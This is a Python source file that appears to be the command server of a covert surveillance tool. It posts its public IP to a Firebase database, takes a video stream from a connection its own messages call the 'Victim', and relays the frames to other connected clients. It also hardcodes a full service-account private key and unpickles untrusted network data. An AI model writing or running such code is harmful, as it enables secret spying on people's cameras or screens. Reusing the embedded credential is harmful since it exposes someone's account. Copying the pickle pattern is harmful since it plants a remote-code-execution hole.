import socket
import pickle
import struct
import threading
import time
import firebase_admin
from firebase_admin import db
from requests import get

ip = get('https://api.ipify.org').text

config = {
  "type": "service_account",
  "project_id": "heroku-62ea3",
  "private_key_id": "05b097b00c48a4e47e415962b8958d9b38e1c4b4",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQClHo9SC4AUQN5d\nHqkWKYeGDHdQXKViGZgh/g7hNqF1v2XuVFueL6g/eGiHeQmPMBto29Esnx/JN0hB\ne+liV9xopkwKX2Fc2k0/gvk+oKGMyrWCdkb/+gv/1nt1lvtBEp8BFfYkiISxfJcb\nc6+sgMWfEbDZAJ10x5rGcBrKuSnDAjs5w+Qy8t70tneCpg9k7XzmVmzG90d70Wkv\nyahNrgaKRezhhbTQW+6dQdFCaA/LBXQT1U4GFWAg841XUaDcwRucLGy8/OH05Ku/\nR8PaPyfwd3zRrv5VaCN4LkJGPT+soLA9UNvrtAXanllMMoFyYzx2TEQh5lRpUIhA\nUJt+GblbAgMBAAECggEANIer3dSlywu2ElbqQRA2Osmlfa3zuWleElZignigVjbt\nZSx2NzV/J64VRyAVD/YkijAAdFstQBTzyk1y+qPsDWj2YQhmD6WtlKqEw81Th9iH\ndTlOrins/lfMUCUXyuRzLGPBum6qFFMIOaYMuer/s/LrWaYN8bR8w2uvwlW0+QIu\nA69Os7ZeVmmclETKJK5EUGt39aD4G0fPd3hJnoK9RAXGIcBOvVF4zVnkyZqf/1Xr\ng2OJEraOVHrQz3Pcffyu4T2UJkeeJAPCKS1rJ2ZcDNQh1FLEY8BMOaVji4ATiNTp\nnwqYWqP6GbUKmrfv4dkOZ1cjdW3falFvr86q7MbcMQKBgQDeEUjKTEqNNcLCb6oq\nsXOFuM/9DbQfRTcCPHGqX0DHqRpVYFHKNvsEKFq1tqS3QvHIRO//T2akRUsCA6xk\nCldzOZ22zc2KmBOFmvHKyusgjR5hXmeDwy/vBL8QXTYB0mAYpskrubUrd0+jcdrC\n2JwTYXw/eMOroNZftboL+AJZawKBgQC+WZv1spuySb+ajdsyZk0bMDRbN6n3zWb2\n789/SAlpgEY0GQ67LZoIqGC69RbAktu9B/WW1ZRqFT4cYzAaBTzAOX4cjaqAXvxB\nrVzTi5R/Yh40mN/s+cFmEBHFmNrBm5ogmRAY5BQSziQFOuNLVUI7C8TaeJUNuNrK\nNYGZMy1r0QKBgB/7v08bo9UovA9DA/A4NJo63wHkWl/ymRSiXgCazXq0OU24nK8S\nMh8MLNxlHN4kLyyX+TT9W5wnOsFkhAy4jJXU44kzpPnkI1On2FFL3oeGq6x8a05H\n63xyY45YznF+ukZypyC8E4LaIUc6G7baecg0zy9ZFl1+wcFxLAWTR8tXAoGAPpmX\nueDoZWTtl3WJnfSY7RUYUttmkXFCqHlLgy98sO6Xp/CJsLMZkjlVvoZ12hUyIOOq\nN9W7vnuH9qwEGLqaNRlzSQ6qARe73BmYipW/23i4OFICapvkp50nSxWu87cppAjS\ni20O0PRsUjAAqji61FJVhgfb9SxS/+dC3NBA4tECgYAGXObaqzUyAmebSUJpc/zk\nYeNImojZGmvsYQpf/LGAi7sM1jGXAoIUFOa01xyXhvKWYDQQ/emxr8jIrfaCyORG\nlIbZr+4HPXcNYRvHJTFWj3HOjU5eqMWLNIX2NCc5qBhUnJvT7gtW8W/QhWXPwulR\nybEiJrfM+c+32cbJKC9VHg==\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-3l83s@heroku-62ea3.iam.gserviceaccount.com",
  "client_id": "102965747026277067882",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-3l83s%40heroku-62ea3.iam.gserviceaccount.com"
}

cred_obj = firebase_admin.credentials.Certificate(config)
default_app = firebase_admin.initialize_app(cred_obj, {'databaseURL':"https://heroku-62ea3-default-rtdb.firebaseio.com/"})

db.reference("/IP").set(ip)
log = db.reference("/log/")

if log.get() is None:
    log.set("")


frame = None
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host_ip = ip
port = 9669
print("Client Serving Server")
print("Host IP:", host_ip)
server_socket.bind((host_ip, port))
server_socket.listen()
print("Listening at:", (host_ip, port), "\n\n")


def video_recv():
    global frame, host_ip
    receive_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 6969
    print("Victim Server: ")
    print("Host IP:", host_ip)
    receive_socket.bind((host_ip, port))
    receive_socket.listen(1)
    print("Listening at:", (host_ip, port), "\n\n")
    victim_socket, addr = receive_socket.accept()
    print(f"Victim Connected at {addr}")
    data = b""
    payload_size = struct.calcsize("Q")
    while True:
        while len(data) < payload_size:
            packet = victim_socket.recv(4*1024)
            if not packet:
                break
            data += packet
        packed_msg_size = data[:payload_size]
        data = data[payload_size:]
        msg_size = struct.unpack("Q", packed_msg_size)[0]

        while len(data) < msg_size:
            data += victim_socket.recv(1024*1024)
        frame_data = data[:msg_size]
        data = data[msg_size:]
        frame = pickle.loads(frame_data)


threading.Thread(target=video_recv).start()


def serve_client(addr, client_socket):
    global frame
    try:
        print(f"Client {addr} Connected!")
        if client_socket:
            while True:
                a = pickle.dumps(frame)
                message = struct.pack("Q", len(a)) + a
                client_socket.sendall(message)
    except Exception as e:
        print(f"Client {addr} Disconnected!")


while True:
    client_socket, addr = server_socket.accept()
    print(addr)
    threading.Thread(target=serve_client, args=(addr, client_socket)).start()
    time.sleep(0.1)
    print("Total Clients:", threading.active_count()-2)
